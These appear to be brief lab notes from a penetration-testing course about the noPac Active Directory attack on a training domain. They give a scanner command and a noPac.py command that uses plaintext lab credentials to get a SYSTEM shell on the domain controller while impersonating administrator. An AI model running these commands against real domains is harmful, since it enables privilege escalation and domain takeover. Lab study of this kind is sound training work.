Scanning for NoPac    Check for Current ms-DS-MachineAccountQuote = 10   if it is 0 the attack will fail
```
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

you can get SYSTEM  with noPac if MachineAccountQuote = 10  !!!EDRs will catch this and stop it!!!
```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
